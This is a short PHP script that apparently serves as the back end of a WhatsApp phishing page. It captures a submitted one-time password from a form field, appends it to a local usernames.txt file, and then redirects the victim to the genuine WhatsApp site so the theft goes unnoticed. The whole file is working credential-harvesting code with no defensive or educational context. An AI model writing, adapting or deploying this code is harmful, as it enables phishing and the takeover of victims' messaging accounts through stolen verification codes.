<?php
file_put_contents("usernames.txt", "Otp=" .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.whatsapp.com/?lang=en');
?>
